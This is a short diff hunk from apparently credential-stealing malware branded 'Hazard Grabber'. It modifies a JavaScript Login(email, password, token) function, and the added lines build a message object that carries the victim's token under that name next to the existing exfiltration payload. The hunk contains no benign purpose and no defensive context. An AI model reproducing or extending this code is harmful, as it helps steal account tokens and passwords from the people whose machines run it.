@@ -139,6 +139,10 @@ function Login(email, password, token) {
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
+var lel = {
+username: "Hazard Grabber",
+            content: `${token}`
+}
         var params = {
             username: "Hazard Grabber",
             content: "",
